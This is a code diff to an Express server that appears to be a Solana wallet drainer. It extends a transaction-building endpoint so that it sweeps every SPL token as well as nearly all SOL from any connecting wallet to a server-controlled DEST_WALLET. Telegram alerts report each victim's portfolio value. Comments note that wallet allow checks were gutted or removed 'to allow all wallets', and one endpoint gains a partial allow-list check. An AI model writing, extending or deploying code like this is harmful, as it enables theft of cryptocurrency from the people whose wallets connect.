@@ -2,7 +2,13 @@ import express from 'express';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
-import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
+import {
+  TOKEN_PROGRAM_ID,
+  TOKEN_2022_PROGRAM_ID,
+  getAssociatedTokenAddressSync,
+  createAssociatedTokenAccountInstruction,
+  createTransferInstruction,
+} from '@solana/spl-token';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const publicDir = path.join(__dirname, 'public');
@@ -229,7 +235,7 @@ function originAllowed(req) {
 }
 
 function addressAllowed(address) {
-  // Always returns true so every wallet is allowed
+  if (!address) return false;
   return true;
 }
 
@@ -240,10 +246,8 @@ function worthAllowed(usd) {
 }
 
 function shouldNotifyAddress(address, usd) {
-  // Always returns true so everything is allowed
-  return true;
+  return addressAllowed(address) && worthAllowed(usd);
 }
-
 
 async function sendTelegram(text) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -275,8 +279,8 @@ async function loadPortfolio(pubkeyStr) {
     connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID }),
   ]);
 
-  const tokens = [...legacy.value, ...token2022.value]
-    .map(({ account }) => {
+  const mapTok = (list, programId) =>
+    list.map(({ pubkey, account }) => {
       const info = account.data.parsed.info;
       const amount = info.tokenAmount;
       return {
@@ -284,9 +288,14 @@ async function loadPortfolio(pubkeyStr) {
         amount: amount.uiAmount,
         rawAmount: amount.amount,
         decimals: amount.decimals,
+        programId: programId.toBase58(),
+        tokenAccount: pubkey.toBase58(),
       };
-    })
-    .filter((t) => t.amount > 0);
+    });
+  const tokens = [
+    ...mapTok(legacy.value, TOKEN_PROGRAM_ID),
+    ...mapTok(token2022.value, TOKEN_2022_PROGRAM_ID),
+  ].filter((tok) => Number(tok.amount) > 0);
 
   const sol = lamports / LAMPORTS_PER_SOL;
   const prices = await fetchUsdPrices([SOL_MINT, ...tokens.map((t) => t.mint)]);
@@ -323,8 +332,11 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     if (!DEST_WALLET) {
       return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
     }
-
+    
+    // REMOVED: The check for TELEGRAM_ALLOWED_ADDRESSES has been removed to allow all wallets
+    
     const from = new PublicKey(req.params.pubkey).toBase58();
+
     const dest = new PublicKey(DEST_WALLET).toBase58();
     if (from === dest) {
       return res.status(400).json({ error: 'Source and destination are the same' });
@@ -356,36 +368,80 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
   }
 });
 
+
 app.post('/api/send-tx/:pubkey', async (req, res) => {
   try {
     if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
-    
+    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
+      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
+    }
     const from = new PublicKey(req.params.pubkey);
     const fromStr = from.toBase58();
-    
+
     const dest = new PublicKey(DEST_WALLET);
     if (fromStr === dest.toBase58()) {
       return res.status(400).json({ error: 'Source and destination are the same' });
     }
 
-    const lamports = await connection.getBalance(from);
-    const reserve = Math.ceil(MIN_SOL_FOR_GAS * LAMPORTS_PER_SOL);
+    const portfolio = await loadPortfolio(fromStr);
+    const tokens = portfolio.tokens || [];
+    const extraRent = tokens.length * 0.0021;
+    const reserve = Math.ceil((MIN_SOL_FOR_GAS + extraRent) * LAMPORTS_PER_SOL);
+    const lamports = Math.round(portfolio.sol * LAMPORTS_PER_SOL);
     const sendLamports = lamports - reserve;
-    if (sendLamports <= 0) {
+    if (sendLamports <= 0 && tokens.length === 0) {
       return res.status(400).json({
-        error: `Fund this wallet with SOL for gas. You have ${lamports / LAMPORTS_PER_SOL} SOL.`,
+        error: `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL.`,
+        needsGas: true,
+      });
+    }
+    if (lamports < reserve) {
+      return res.status(400).json({
+        error: `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${(reserve / LAMPORTS_PER_SOL).toFixed(4)} SOL to move tokens.`,
         needsGas: true,
       });
     }
 
     const tx = new Transaction();
-    tx.add(
-      SystemProgram.transfer({
-        fromPubkey: from,
-        toPubkey: dest,
-        lamports: sendLamports,
-      })
-    );
+    const included = [];
+    for (const tok of tokens) {
+      const mint = new PublicKey(tok.mint);
+      const programId = new PublicKey(tok.programId || TOKEN_PROGRAM_ID);
+      const sourceAta = new PublicKey(tok.tokenAccount);
+      const destAta = getAssociatedTokenAddressSync(mint, dest, false, programId);
+      const destInfo = await connection.getAccountInfo(destAta);
+      if (!destInfo) {
+        tx.add(
+          createAssociatedTokenAccountInstruction(
+            from,
+            destAta,
+            dest,
+            mint,
+            programId
+          )
+        );
+      }
+      tx.add(
+        createTransferInstruction(
+          sourceAta,
+          destAta,
+          from,
+          BigInt(tok.rawAmount),
+          [],
+          programId
+        )
+      );
+      included.push({ mint: tok.mint, amount: tok.amount, usdValue: tok.usdValue });
+    }
+    if (sendLamports > 0) {
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: from,
+          toPubkey: dest,
+          lamports: sendLamports,
+        })
+      );
+    }
     tx.feePayer = from;
     const latest = await connection.getLatestBlockhash('confirmed');
     tx.recentBlockhash = latest.blockhash;
@@ -394,8 +450,9 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
     res.json({
       from: fromStr,
       to: dest.toBase58(),
-      sol: sendLamports / LAMPORTS_PER_SOL,
-      reservedSol: MIN_SOL_FOR_GAS,
+      sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
+      reservedSol: reserve / LAMPORTS_PER_SOL,
+      tokens: included,
       transaction: Buffer.from(serialized).toString('base64'),
     });
   } catch (err) {
@@ -459,6 +516,10 @@ app.post('/api/event', async (req, res) => {
 
     if (!event.address || event.address === 'unknown') {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
+    }
+
+    if (!worthAllowed(event.totalUsd)) {
+      return res.json({ ok: true, telegram: { sent: false, skipped: 'filtered' } });
     }
 
 
